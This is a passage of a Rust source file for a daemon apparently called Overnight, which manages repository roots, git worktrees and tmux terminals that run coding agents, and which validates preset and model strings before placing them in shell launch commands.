//! Domain services: the operations a client can invoke.
//!
//! Every read that reports terminal or workspace state DERIVES it from durable
//! intent joined against the live tmux inventory. Nothing here ever reads a
//! stored runtime state, because none exists.

use std::path::{Path, PathBuf};

use overnight_core::{
    DomainError, Result,
    derive::{self, DerivedTerminal},
    inventory::RuntimeInventory,
    validate,
};
use overnight_protocol::v1::{TerminalIntent, TerminalState, WorkspaceState};
use overnight_store::{Store, models};
use overnight_tmux::{LiveInventory, TmuxServer};
use uuid::Uuid;

use crate::runtime::Runtime;
use crate::{agent_supervisor, git, paths, session_discovery};

/// Launch presets. Coding agents run through the user's configured shell so
/// startup files, version managers, direnv, and aliases behave like a
/// hand-launched terminal. The default mode is an interactive login shell.
/// Build the command for a preset.
///
/// A preset may carry a model after a colon — `claude:opus`. Encoded in the
/// preset rather than added as a second field because it travels through the
/// protocol, the CLI, the store and three clients as one string, and every one
/// of those would otherwise need a parallel parameter that is almost always
/// empty.
///
/// The model is validated before it reaches a shell. It is the only part of
/// this that a client supplies freely, and it ends up inside a `-ilc` string.
///
/// `session_id`, when given to a `claude` preset, is declared to the process
/// with `--session-id` rather than left to be discovered later from whichever
/// `.jsonl` file under `~/.claude/projects` turns out to be newest. Only
/// `claude` understands the flag, so every other preset ignores it.
pub fn preset_command(preset: &str, session_id: Option<&str>) -> String {
    let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".to_string());
    let (agent, model) = match preset.split_once(':') {
        Some((a, m)) if is_safe_model(m) => (a, Some(m)),
        // A model that is not a plain identifier is dropped, not escaped and
        // not passed on. Nothing legitimate is lost and there is no argument
        // about quoting.
        Some((a, _)) => (a, None),
        None => (preset, None),
    };

    let flag = model.map(|m| format!(" --model {m}")).unwrap_or_default();

    // Declared, not discovered — but it still ends up inside a `-ilc` string,
    // so anything that is not a plain uuid is dropped rather than escaped. The
    // cost of dropping it is one adoption that has to fall back to searching.
    let session = session_id
        .filter(|s| Uuid::parse_str(s).is_ok())
        .map(|s| format!(" --session-id {s}"))
        .unwrap_or_default();

    match agent {
        "shell" => format!("{shell} -il"),
        "claude" => format!("{shell} -ilc 'claude{flag}{session}'"),
        "codex" => format!("{shell} -ilc 'codex{flag}'"),
        "cursor" => format!("{shell} -ilc 'cursor-agent{flag}'"),
        other if is_safe_model(other) => format!("{shell} -ilc '{other}{flag}'"),
        // An unrecognised preset that is not a plain identifier is not run at
        // all. A preset is chosen from a list; anything else is a bug or an
        // attempt.
        _ => format!("{shell} -il"),
    }
}

/// A plain identifier: letters, digits, dot, dash, underscore.
///
/// Deliberately narrower than what a shell would accept. Every real model name
/// fits, and nothing that fits can end a quoted string.
fn is_safe_model(text: &str) -> bool {
    !text.is_empty()
        && text.len() <= 64
        && text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
}

pub struct Service {
    pub store: Store,
    pub tmux: TmuxServer,
    pub inventory: LiveInventory,
    pub host_id: Uuid,
    /// Where this service's runtime data lives.
    ///
    /// Held rather than re-derived from `OVERNIGHT_HOME` at each use. The
    /// environment is process-global, so a service that consulted it on every
    /// call could be moved out from under itself — which is exactly what
    /// happens when two tests run in parallel, and would happen in production
    /// the first time anything set the variable after startup.
    root: PathBuf,
    /// Every terminal's agent session: activity, cursor, and the fast-attach
    /// event window. See `agent_supervisor` for why the transcript itself is
    /// not here.
    agents: agent_supervisor::AgentSupervisor,
}

/// A workspace plus its derived state and terminals.
#[derive(Debug)]
pub struct WorkspaceView {
    pub workspace: models::Workspace,
    pub state: WorkspaceState,
    pub terminals: Vec<TerminalView>,
}

#[derive(Debug)]
pub struct TerminalView {
    pub terminal: models::Terminal,
    pub derived: DerivedTerminal,
}

impl TerminalView {
    pub fn state(&self) -> TerminalState {
        self.derived.state
    }
}

impl Service {
    /// Open the service at the user's runtime directory.
    pub async fn open() -> Result<Self> {
        Self::open_in(paths::ensure_runtime_dir()?).await
    }

    /// Open the service at an explicit directory.
    ///
    /// The environment is read once, at the edge, so nothing below this point
    /// depends on a process-global that another thread can change.
    pub async fn open_in(root: PathBuf) -> Result<Self> {
        let install_id = paths::load_or_create_install_id_in(&root)?;
        let store = Store::open(root.join("overnight.db"))?;

        // The daemon identity is stable per install, so tags written by a prior
        // run of this same daemon remain provable after a restart.
        let host_id = stable_host_id(&install_id);
        let tmux = TmuxServer::new(&install_id, host_id);
        let inventory = LiveInventory::new(tmux.clone());
        inventory.refresh().await;

        Ok(Self { store, tmux, inventory, host_id, root, agents: agent_supervisor::AgentSupervisor::new() })
    }

    /// The supervisor for every terminal's agent session.
    pub fn agents(&self) -> &agent_supervisor::AgentSupervisor {
        &self.agents
    }

    /// Where managed worktrees are created, one directory per workspace.
    fn worktrees_dir(&self) -> Result<PathBuf> {
        let dir = self.root.join("worktrees");
        std::fs::create_dir_all(&dir).map_err(|_| DomainError::OperationFailed)?;
        Ok(dir)
    }

    // ---- repository roots ----

    /// Add an allowlisted repository root.
    ///
    /// Canonicalizes, rejects a path that is not an existing directory, rejects
    /// nesting inside or containing an existing root, and rejects sensitive
    /// locations. Adding a root does not scan or register anything inside it.
    pub async fn add_root(&self, path: &Path) -> Result<models::RepositoryRoot> {
        let canonical = path.canonicalize().map_err(|_| DomainError::InvalidArgument {
            what: "path does not exist",
        })?;
        if !canonical.is_dir() {
            return Err(DomainError::InvalidArgument { what: "not a directory" });
        }
        reject_sensitive_root(&canonical)?;

        for existing in self.store.list_repository_roots()? {
            let e = PathBuf::from(&existing.path);
            if canonical.starts_with(&e) || e.starts_with(&canonical) {
                return Err(DomainError::PathNotAllowed);
            }
        }

        self.store.create_repository_root(
            self.host_id,
            &canonical.to_string_lossy(),
            now_millis(),
        )
    }

    pub fn list_roots(&self) -> Result<Vec<models::RepositoryRoot>> {
        self.store.list_repository_roots()
    }

    /// Every repository path must sit inside an allowlisted root.
    fn root_for(&self, path: &Path) -> Result<models::RepositoryRoot> {
        self.store
            .list_repository_roots()?
            .into_iter()
            .find(|r| path.starts_with(&r.path))
            .ok_or(DomainError::PathNotAllowed)
    }

    // ---- repositories ----

    pub async fn register_repository(&self, path: &Path) -> Result<models::Repository> {
        let canonical = path
            .canonicalize()
            .map_err(|_| DomainError::InvalidArgument { what: "path does not exist" })?;
        let root = self.root_for(&canonical)?;

        let git_dir = git::validate_repository(&canonical).await?;
        let display_name = canonical
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_else(|| "repository".to_string());
        validate::display_name(&display_name)?;

        let remote = git::remote_summary(&canonical).await;

        self.store.create_repository(
            self.host_id,
            root.id,
            &display_name,
            &git_dir.to_string_lossy(),
            &remote,
        )
    }

    pub fn list_repositories(&self) -> Result<Vec<models::Repository>> {
        let mut all = Vec::new();
        for root in self.store.list_repository_roots()? {
            all.extend(self.store.list_repositories_for_root(root.id)?);
        }
        Ok(all)
    }

    /// The working tree for a registered repository.
    ///
    /// `canonical_git_dir` is the `.git` directory, so the working tree is its
    /// parent for an ordinary non-bare repository.
    fn repository_worktree(&self, repo: &models::Repository) -> PathBuf {
        let git_dir = PathBuf::from(&repo.canonical_git_dir);
        git_dir.parent().map(|p| p.to_path_buf()).unwrap_or(git_dir)
    }

    // ---- workspaces ----

    /// Create a workspace: one worktree plus branch for one task.
    ///
    /// Git succeeds before any metadata is written. If metadata then fails, the
    /// newly created clean worktree and unpushed branch are rolled back, and a
    /// dirty one is preserved instead.
    pub async fn create_workspace(
        &self,
        repository_id: Uuid,
        task_name: &str,
        branch: &str,
        base_revision: &str,
    ) -> Result<models::Workspace> {
        validate::task_name(task_name)?;
        validate::branch_name(branch)?;

        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);

        let dest = self.worktrees_dir()?.join(format!(
            "{}-{}",
            sanitize(&repo.display_name),
            sanitize(task_name)
        ));

        let base_commit = git::resolve_revision(&repo_path, base_revision).await?;
        git::create_worktree(&repo_path, branch, base_revision, &dest).await?;

        match self.store.create_workspace(
            repository_id,
            task_name,
            branch,
            &dest.to_string_lossy(),
        ) {
            Ok(ws) => Ok(ws),
            Err(e) => {
                // Do not erase a possibly valuable worktree to make the database
                // look clean. Roll back only what is provably safe.
                let removed = git::rollback_worktree(&repo_path, branch, &dest, &base_commit)
                    .await
                    .unwrap_or(false);
                tracing::warn!(rolled_back = removed, "workspace metadata failed after git");
                Err(e)
            }
        }
    }

    /// Branches in a repository that work could be resumed on.
    pub async fn list_branches(&self, repository_id: Uuid) -> Result<Vec<git::BranchInfo>> {
        let repo = self.store.get_repository(repository_id)?;
        git::list_branches(&self.repository_worktree(&repo)).await
    }

    /// Create a workspace on a branch that already exists.
    ///
    /// The other half of `create_workspace`. Work arrives on a branch as often
    /// as it starts on one: pushed from another machine, handed over by someone
    /// else, or produced by an agent running somewhere else entirely. Without
    /// this, picking that work up meant doing it by hand outside Overnight and
    /// then having Overnight not know about it.
    /// Worktrees that exist on disk but are not yet task workspaces.
    ///
    /// The onboarding path. Someone arrives with a repository they have been
    /// working in for months and several worktrees already checked out, and
    /// until Overnight can see those it only knows about work it started itself
    /// — which means re-creating by hand everything you already have.
    ///
    /// The main checkout is excluded. It is where you work directly, and turning
    /// it into a task workspace would put an agent in it. So is anything already
    /// registered, matched by canonical path so a symlinked or relative spelling
    /// of the same directory is not offered as new.
    pub async fn discover_worktrees(&self, repository_id: Uuid) -> Result<Vec<git::WorktreeInfo>> {
        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);

        let known: std::collections::HashSet<PathBuf> = self
            .store
            .list_workspaces_for_repository(repository_id)?
            .iter()
            .map(|w| canonical_or_raw(&w.worktree_path))
            .collect();

        Ok(git::list_worktrees(&repo_path)
            .await?
            .into_iter()
            .filter(|w| !w.is_main)
            // A prunable record points at a directory that is gone. Offering it
            // would create a workspace whose worktree does not exist.
            .filter(|w| !w.prunable)
            .filter(|w| !known.contains(&canonical_or_raw(&w.path)))
            .collect())
    }

    /// Register a worktree that already exists, without touching git.
    ///
    /// Deliberately creates nothing: no branch, no directory, no checkout. The
    /// worktree is already there and already someone's work in progress, so the
    /// only thing missing is a record — and if importing could modify it, nobody
    /// would risk pointing this at a directory they cared about.
    pub async fn import_worktree(
        &self,
        repository_id: Uuid,
        path: &str,
        task_name: Option<&str>,
    ) -> Result<models::Workspace> {
        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);

        // Taken from git's own list rather than from the caller, so a path that
        // is not actually a worktree of this repository cannot be registered by
        // asking nicely.
        let found = git::list_worktrees(&repo_path)
            .await?
            .into_iter()
            .find(|w| canonical_or_raw(&w.path) == canonical_or_raw(path))
            .ok_or(DomainError::NotFound)?;

        if found.is_main {
            // The repository's own checkout. Refused for the same reason it is
            // not offered: it is where the human works.
            return Err(DomainError::InvalidArgument { what: "the main checkout" });
        }
        if !std::path::Path::new(&found.path).is_dir() {
            return Err(DomainError::NotFound);
        }

        let branch = found.branch.clone().unwrap_or_else(|| {
            // A detached worktree still has a commit, and that is the honest
            // thing to call it rather than inventing a branch name.
            format!("detached at {}", found.head.chars().take(8).collect::<String>())
        });

        let name = match task_name {
            Some(given) => given.to_string(),
            // The directory's own name, which is what the person who made the
            // worktree already chose to call this piece of work.
            None => std::path::Path::new(&found.path)
                .file_name()
                .map(|n| n.to_string_lossy().to_string())
                .unwrap_or_else(|| branch.clone()),
        };
        validate::task_name(&name)?;

        self.store.create_workspace(repository_id, &name, &branch, &found.path)
    }

    pub async fn adopt_branch(
        &self,
        repository_id: Uuid,
        task_name: &str,
        branch: &str,
    ) -> Result<models::Workspace> {
        validate::task_name(task_name)?;
        validate::branch_name(branch)?;

        let repo = self.store.get_repository(repository_id)?;
        let repo_path = self.repository_worktree(&repo);

        let dest = self.worktrees_dir()?.join(format!(
            "{}-{}",
            sanitize(&repo.display_name),
            sanitize(task_name)
        ));

        git::create_worktree_from_branch(&repo_path, branch, &dest).await?;

        match self.store.create_workspace(
            repository_id,
            task_name,
            branch,
            &dest.to_string_lossy(),
        ) {
            Ok(workspace) => Ok(workspace),
            Err(e) => {
                // The worktree exists but nothing records it. Remove it —
                // carefully, and never the branch, which was not ours to make.
                let _ = git::git(
                    &repo_path,
                    &["worktree", "remove", &dest.to_string_lossy()],
                )
                .await;
                Err(e)
            }
        }
    }

    pub fn list_workspaces(&self) -> Result<Vec<models::Workspace>> {
        let mut all = Vec::new();
        for repo in self.list_repositories()? {
            all.extend(self.store.list_workspaces_for_repository(repo.id)?);
        }
        Ok(all)
    }

    /// Archive hides a workspace and never changes git data. It is prohibited
    /// while any managed terminal is running.
    pub async fn archive_workspace(&self, id: Uuid) -> Result<models::Workspace> {
        let ws = self.store.get_workspace(id)?;
        let view = self.workspace_view(&ws).await?;

        if view.terminals.iter().any(|t| t.state() == TerminalState::Running) {
            return Err(DomainError::RunningProcesses);
        }

        self.store.update_workspace(
            id,
            ws.resource_version,
            &ws.task_name,
            &ws.branch,
            &ws.worktree_path,
            true,
            ws.creation_failed,
        )
    }

    /// Delete a terminal's record.
    ///
    /// For a terminal that is already gone: its command exited and there is
    /// nothing left to show. Refused while one is still live, because removing
    /// the record of a running process would orphan it — it would keep running
    /// inside tmux with nothing left that knows it exists.
    pub async fn remove_terminal(&self, id: Uuid) -> Result<()> {
        let record = self.store.get_terminal(id)?;
        let derived = self.derive_one(&record);
        if matches!(derived.state, TerminalState::Running | TerminalState::Starting) {
            return Err(DomainError::RunningProcesses);
        }

        // Take the retained dead pane with it. `remain-on-exit` keeps one so a
        // clean exit is distinguishable from a loss; once the record is gone
        // there is nothing left for it to prove.
        //
        // Nothing else to clean up: the layout IS the panes, so killing the pane
        // removes it from the arrangement, and tmux collapses the split. The old
        // model needed a separate step here to stop a stored group pointing at a
        // terminal that no longer existed.
        let _ = self.kill_pane(id).await;
        self.store.delete_terminal(id, record.resource_version)
    }

    /// Bring an archived workspace back.
    ///
    /// Archiving hides; it never touched git, so restoring never has to
    /// reconstruct anything. If the worktree was separately removed the
    /// workspace comes back without one and derives its state accordingly,
    /// which is more honest than refusing to show it at all.
    pub async fn restore_workspace(&self, id: Uuid) -> Result<models::Workspace> {
        let ws = self.store.get_workspace(id)?;
        if !ws.archived {
            return Ok(ws);
        }
        self.store.update_workspace(
            id,
            ws.resource_version,
            &ws.task_name,
            &ws.branch,
            &ws.worktree_path,
            false,
            ws.creation_failed,
        )
    }

    /// Stop allowing Overnight to operate under a directory.
    ///
    /// Refused while any workspace under this root is still live, because a
    /// root is the thing that makes those workspaces legal: removing it while
    /// they exist would leave records Overnight can no longer act on. Archived
    /// workspaces do not block it — they are already out of the way — and
    /// nothing on disk is touched either way.
    pub async fn remove_root(&self, id: Uuid) -> Result<models::RepositoryRoot> {
        let root = self.store.get_repository_root(id)?;
        let repositories = self.store.list_repositories_for_root(id)?;

        // Refused while ANY workspace remains, archived or not.
        //
        // The design's rule was "refused while non-archived workspaces exist",
        // which is the right instinct but leaves a gap: an archived workspace
        // still has a worktree directory on disk. Deleting its record with the
        // root would strand that directory somewhere Overnight is no longer
        // allowed to touch, so it could never be cleaned up. Removing the
        // worktree already deletes the record, so "remove the worktrees first"
        // is a reachable instruction rather than a dead end.
        let mut remaining = 0;
        for repository in &repositories {
            remaining += self.store.list_workspaces_for_repository(repository.id)?.len();
        }
        if remaining > 0 {
            return Err(DomainError::WorkspacesExist);
        }

        // The repositories go with it. They exist only as members of a root,
        // and leaving them behind would strand rows pointing at nothing.
        for repository in repositories {
            self.store.delete_repository(repository.id, repository.resource_version)?;
        }
        self.store.delete_repository_root(id, root.resource_version)?;
        Ok(root)
    }

    /// Remove a workspace's worktree.
    ///
    /// The most destructive action in the product. Refused while any managed
    /// terminal is running, and it never deletes the branch: git history and
    /// anything pushed survive untouched. A dirty worktree still requires the
    /// caller to have confirmed, which the client enforces by demanding the
    /// exact workspace name.
    pub async fn remove_worktree(&self, id: Uuid) -> Result<()> {
        let ws = self.store.get_workspace(id)?;
        let view = self.workspace_view(&ws).await?;

        if view.terminals.iter().any(|t| t.state() == TerminalState::Running) {
            return Err(DomainError::RunningProcesses);
        }

        let repo = self.store.get_repository(ws.repository_id)?;
        let repo_path = self.repository_worktree(&repo);
        let dest = PathBuf::from(&ws.worktree_path);

        let out = git::git(
            &repo_path,
            &["worktree", "remove", "--force", &dest.to_string_lossy()],
        )
        .await?;

        if !out.ok {
            tracing::warn!(stderr = %out.stderr, "worktree remove failed");
            return Err(DomainError::OperationFailed);
        }

        // The workspace record goes with the worktree; the BRANCH stays.
        self.store.delete_workspace(id, ws.resource_version)
    }

    // ---- terminals ----

    /// Create a terminal: a tagged tmux window running the preset.
    pub async fn create_terminal(
        &self,
        workspace_id: Uuid,
        title: &str,
        command_preset: &str,
    ) -> Result<models::Terminal> {
        validate::display_name(title)?;
        validate::command_preset(command_preset)?;

        let ws = self.store.get_workspace(workspace_id)?;

        // 1. Commit the durable record with intent RUNNING, unconfirmed.
        let term = self.store.create_terminal(
            workspace_id,
            title,
            command_preset,
            TerminalIntent::Running,
            120,
            40,
        )?;

        // A claude terminal gets its session id now, so that adopting it into
        // agent pane mode later is exact.
        let declared = command_preset.starts_with("claude").then(|| Uuid::now_v7().to_string());
        let term = if let Some(ref sid) = declared {
            self.store.set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Terminal,
                Some(sid.clone()),
            )?
        } else {
            term
        };

        // 2. Create and tag the window.
        let command = preset_command(command_preset, declared.as_deref());
        let created = self
            .tmux
            .create_terminal_window(workspace_id, term.id, title, &ws.worktree_path, &command)
            .await;

        if let Err(e) = created {
            // Creation never established a live runtime.
            let _ = self.store.update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.intent = TerminalIntent::Failed),
            );
            return Err(e);
        }

        // 3. Verify exact tags on a live pane through a fresh query.
        let snapshot = self.inventory.refresh().await;
        let proved = snapshot.claimants(term.id).iter().any(|p| p.proves_life());

        if proved {
            // 4. Only now is the runtime confirmed.
            return self.store.update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.runtime_confirmed = true),
            );
        }

        // Verification failed. Leave the record and its intent in place: the
        // derivation reports it truthfully until the user resolves it.
        tracing::warn!(terminal = %term.id, "created window did not verify");
        Ok(term)
    }

    /// Give every live pane its identity on the pane itself.
    ///
    /// A one-shot repair at startup, for terminals created before identity moved
    /// from the window to the pane. Those carry their id as a WINDOW option,
    /// which reads correctly — panes inherit window options — right up until the
    /// pane is moved into a different window, at which point it inherits the
    /// destination's options instead and the terminal becomes unidentifiable.
    ///
    /// `join-pane` re-tags as it goes, so a move is safe either way. This exists
    /// because a fleet that has been running for days should not have to be
    /// dragged through a move to be repaired, and because the failure is silent
    /// and expensive: a terminal that loses its id derives as `lost` and takes
    /// its workspace to `error`.
    ///
    /// Idempotent, and cheap enough to run unconditionally: setting a pane option
    /// to the value it already has is one tmux call per live pane, once.
    pub async fn backfill_pane_tags(&self) {
        let Ok(panes) = self.tmux.list_tagged_panes().await else { return };
        let mut repaired = 0;
        for pane in panes.iter().filter(|p| p.daemon_id == self.tmux.daemon_id()) {
            if self.tmux.tag_pane_public(&pane.pane_id, pane.terminal_id).await.is_ok() {
                repaired += 1;
            }
        }
        if repaired > 0 {
            tracing::info!(panes = repaired, "pinned pane identity");
        }
    }

    /// A new terminal in an existing layout, beside a pane already there.
    ///
    /// The same act as `create_terminal` except for where the pane lands: a split
    /// of an existing one rather than a window of its own. That difference is the
    /// whole of `%`, `"`, and dropping something on a pane's edge.
    ///
    /// Deliberately shares the create-then-verify order with `create_terminal`:
    /// the durable record goes in first with intent RUNNING and unconfirmed, the
    /// pane is made, and only a fresh query proving a live tagged pane marks it
    /// confirmed. A split that fails leaves a record the derivation reports
    /// honestly rather than one that claims to be running.
    pub async fn split_terminal(
        &self,
        workspace_id: Uuid,
        target: Uuid,
        side: overnight_protocol::v1::SplitSide,
        title: &str,
        command_preset: &str,
    ) -> Result<models::Terminal> {
        validate::display_name(title)?;
        validate::command_preset(command_preset)?;

        let ws = self.store.get_workspace(workspace_id)?;
        let pane = self.pane_of(target).await?;
        let (axis, before) = crate::layout::split_args(side);

        let term = self.store.create_terminal(
            workspace_id,
            title,
            command_preset,
            TerminalIntent::Running,
            120,
            40,
        )?;

        let command = preset_command(command_preset, term.agent_session_id.as_deref());
        let created = self
            .tmux
            .split_pane(&pane.pane_id, axis, term.id, &ws.worktree_path, &command, before)
            .await;

        let pane_id = match created {
            Ok(id) => id,
            Err(e) => {
                let _ = self.store.update_terminal(
                    term.id,
                    term.resource_version,
                    terminal_update(&term, |u| u.intent = TerminalIntent::Failed),
                );
                return Err(e);
            }
        };

        // The new pane takes the keyboard: you split in order to type in it.
        let _ = self.tmux.select_pane(&pane_id).await;

        let snapshot = self.inventory.refresh().await;
        if snapshot.claimants(term.id).iter().any(|p| p.proves_life()) {
            return self.store.update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.runtime_confirmed = true),
            );
        }

        tracing::warn!(terminal = %term.id, "split pane did not verify");
        Ok(term)
    }

    /// Kill exactly this terminal's pane.
    ///
    /// A pane, not a window: a window is now a whole layout, and killing one
    /// would take every other terminal in it. That was safe only while each
    /// window held a single pane.
    async fn kill_pane(&self, id: Uuid) -> Result<bool> {
        let Ok(pane) = self.pane_of(id).await else { return Ok(false) };
        self.tmux.kill_pane(&pane.pane_id).await
    }

    /// Stop a terminal. Signals the daemon-owned pane, then records intent.
    pub async fn stop_terminal(&self, id: Uuid) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        self.kill_pane(id).await?;
        self.inventory.refresh().await;

        self.store.update_terminal(
            id,
            term.resource_version,
            terminal_update(&term, |u| u.intent = TerminalIntent::Stopped),
        )
    }

    /// Acknowledge a loss without ever relabelling the terminal as exited.
    pub async fn dismiss_lost(&self, id: Uuid) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        let derived = self.derive_one(&term);

        if derived.state != TerminalState::Lost {
            return Err(DomainError::InvalidArgument { what: "terminal is not lost" });
        }

        self.store.update_terminal(
            id,
            term.resource_version,
            terminal_update(&term, |u| u.loss_dismissed = true),
        )
    }

    /// Restart a lost or exited terminal as a NEW epoch from the same preset.
    pub async fn restart_terminal(&self, id: Uuid) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        let ws = self.store.get_workspace(term.workspace_id)?;

        let _ = self.tmux.kill_terminal_window(id).await;

        // A restarted claude reattaches to the conversation it already had
        // rather than starting a new one the record does not know about.
        let command = preset_command(&term.command_preset, term.agent_session_id.as_deref());
        self.tmux
            .create_terminal_window(term.workspace_id, id, &term.title, &ws.worktree_path, &command)
            .await?;

        self.inventory.refresh().await;

        self.store.update_terminal(
            id,
            term.resource_version,
            terminal_update(&term, |u| {
                u.intent = TerminalIntent::Running;
                u.runtime_confirmed = true;
                u.loss_dismissed = false;
                u.exit_code = None;
                u.exit_signal = None;
                // A new runtime means a new epoch: offsets restart at zero.
                u.epoch = term.epoch + 1;
            }),
        )
    }

    /// Toggle a terminal between hosting a TUI and hosting an ACP agent.
    ///
    /// The pane is respawned rather than replaced, so the terminal keeps its
    /// id, its tag and its rectangle, and a chat opening in one tile of four
    /// does not rearrange the other three.
    pub async fn set_pane_mode(
        &self,
        id: Uuid,
        pane_mode: models::PaneMode,
        force: bool,
    ) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        let ws = self.store.get_workspace(term.workspace_id)?;

        // `ConfirmationRequired` rather than a new code: a turn in flight is
        // exactly the existing "tell the user what this destroys and ask", and
        // `force` is the confirmation coming back.
        agent_supervisor::guard_toggle(self.agents.activity(id), force)
            .map_err(|_| DomainError::ConfirmationRequired)?;

        let snapshot = self.inventory.refresh().await;
        let pane = snapshot
            .claimants(id)
            .into_iter()
            .find(|p| p.proves_life())
            .ok_or(DomainError::NotFound)?;

        // A session id already declared at launch is reused; a hand-started
        // agent is looked up, and an ambiguous lookup refuses rather than
        // attaching a chat to the wrong conversation.
        let session_id = match term.agent_session_id.clone() {
            Some(existing) => Some(existing),
            None => {
                let home = directories::UserDirs::new()
                    .map(|d| d.home_dir().to_path_buf())
                    .ok_or(DomainError::NotFound)?;
                session_discovery::discover_claude_session(
                    &home,
                    Path::new(&ws.worktree_path),
                    std::time::SystemTime::UNIX_EPOCH,
                )
                .ok()
            }
        };

        let command = match pane_mode {
            models::PaneMode::Terminal => {
                let sid = session_id.clone().unwrap_or_default();
                let shell = std::env::var("SHELL").unwrap_or_else(|_| "/bin/zsh".to_string());
                if Uuid::parse_str(&sid).is_ok() {
                    format!("{shell} -ilc 'claude --resume {sid}'")
                } else {
                    preset_command(&term.command_preset, None)
                }
            }
            models::PaneMode::Agent => {
                let binary = std::env::current_exe()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|_| "overnight".to_string());
                // `root`, not a second `runtime_dir` field: it is already where
                // this daemon's socket-bearing runtime state lives, and a
                // parallel field would only ever be able to agree with it or be
                // a bug.
                let socket = agent_supervisor::socket_path(&self.root, id).display().to_string();
                let session = session_id
                    .as_deref()
                    .map(|s| format!(" --session {s}"))
                    .unwrap_or_default();
                format!(
                    "{binary} agent-host --terminal {id} --socket {socket} --worktree {} {session}",
                    ws.worktree_path
                )
            }
        };

        self.tmux.respawn_pane(&pane.pane_id, &ws.worktree_path, &command).await?;
        self.store.set_pane_mode(id, term.resource_version, pane_mode, session_id)
    }

    /// Files in a workspace's worktree, for the `@`-mention picker.
    ///
    /// Substring match on the worktree-relative path, capped. Deliberately not
    /// a git call: an untracked file the agent just created is exactly the one
    /// a user wants to mention next.
    pub async fn search_worktree_files(
        &self,
        workspace_id: Uuid,
        query: &str,
        limit: u32,
    ) -> Result<Vec<String>> {
        let ws = self.store.get_workspace(workspace_id)?;
        let root = PathBuf::from(&ws.worktree_path);
        let needle = query.to_lowercase();
        let cap = if limit == 0 { 50 } else { limit.min(500) } as usize;

        let mut out = Vec::new();
        let mut stack = vec![root.clone()];
        while let Some(dir) = stack.pop() {
            let Ok(entries) = std::fs::read_dir(&dir) else { continue };
            for entry in entries.flatten() {
                let path = entry.path();
                let name = entry.file_name();
                let name = name.to_string_lossy();
                // `.git` is enormous and never mentionable; `target` and
                // `node_modules` are build output nobody `@`-mentions and
                // walking them would dwarf the rest of the tree.
                if name == ".git" || name == "target" || name == "node_modules" {
                    continue;
                }
                if path.is_dir() {
                    stack.push(path);
                    continue;
                }
                let Ok(relative) = path.strip_prefix(&root) else { continue };
                let relative = relative.display().to_string();
                if needle.is_empty() || relative.to_lowercase().contains(&needle) {
                    out.push(relative);
                    if out.len() >= cap {
                        return Ok(out);
                    }
                }
            }
        }
        Ok(out)
    }

    // ---- runtime ----
    //
    // These operate on tmux alone and never touch the database, which is what
    // lets a client stream a terminal without going through the daemon at all.
    // They live on `Runtime`; `Service` exposes them for callers that already
    // hold one.

    pub fn runtime(&self) -> Runtime {
        // A clone, but not a copy: `LiveInventory` shares one `Arc` view, so
        // this is the same inventory rather than a second one that could
        // disagree with it.
        Runtime { tmux: self.tmux.clone(), inventory: self.inventory.clone() }
    }

    pub async fn send_input(&self, id: Uuid, data: &str) -> Result<()> {
        self.runtime().send_input(id, data).await
    }

    pub async fn send_bytes_hex(&self, id: Uuid, hex: &str) -> Result<()> {
        self.runtime().send_bytes_hex(id, hex).await
    }

    pub async fn screen(&self, id: Uuid) -> Result<(String, u32, u32)> {
        self.runtime().screen(id).await
    }

    pub async fn stream(&self, id: Uuid) -> Result<()> {
        self.runtime().stream(id).await
    }

    pub async fn input_channel(&self, id: Uuid) -> Result<()> {
        self.runtime().input_channel(id).await
    }

    pub async fn resize_terminal(&self, id: Uuid, columns: u32, rows: u32) -> Result<()> {
        self.runtime().resize_terminal(id, columns, rows).await
    }

    /// The escape sequences that put a fresh emulator into the modes this
    /// pane's program is in. See `TerminalScreen.modes`.
    pub async fn pane_modes(&self, id: Uuid) -> Result<String> {
        self.runtime().pane_modes(id).await
    }

    /// Where the cursor is, so a client can draw it in the right cell.
    pub async fn cursor(&self, id: Uuid) -> Result<(u32, u32)> {
        self.runtime().cursor(id).await
    }

    /// Send exact bytes to a terminal.
    ///
    /// Bytes rather than text, because a key is not always a character: arrows,
    /// Ctrl-C and a bracketed paste are byte sequences, and anything re-encoding
    /// them on the way would need to know the terminal's mode to get them right.
    pub async fn send_bytes(&self, id: Uuid, payload: &[u8]) -> Result<()> {
        let hex: String = payload.iter().map(|b| format!("{b:02x}")).collect();
        self.runtime().send_bytes_hex(id, &hex).await
    }

    pub async fn capture(&self, id: Uuid, lines: u32) -> Result<String> {
        self.runtime().capture(id, lines).await
    }

    // ---- derivation ----

    /// The live runtime view as of the last refresh.
    pub fn inventory_snapshot(&self) -> overnight_core::inventory::RuntimeSnapshot {
        self.inventory.snapshot()
    }

    fn derive_one(&self, term: &models::Terminal) -> DerivedTerminal {
        let snapshot = self.inventory.snapshot();
        derive::derive_terminal(&to_record(term), &snapshot)
    }

    /// One workspace with every state derived fresh.
    pub async fn workspace_view(&self, ws: &models::Workspace) -> Result<WorkspaceView> {
        let snapshot = self.inventory.snapshot();
        let terminals = self.store.list_terminals_for_workspace(ws.id)?;

        let views: Vec<TerminalView> = terminals
            .into_iter()
            .map(|t| {
                let derived = derive::derive_terminal(&to_record(&t), &snapshot);
                TerminalView { terminal: t, derived }
            })
            .collect();

        let pairs: Vec<_> = views
            .iter()
            .map(|v| (to_record(&v.terminal), v.derived.clone()))
            .collect();

        let state = derive::derive_workspace(ws.archived, ws.creation_failed, &pairs);

        Ok(WorkspaceView { workspace: ws.clone(), state, terminals: views })
    }

    /// The whole fleet, refreshed once. One inventory query, not one per terminal.
    pub async fn fleet(&self) -> Result<Vec<WorkspaceView>> {
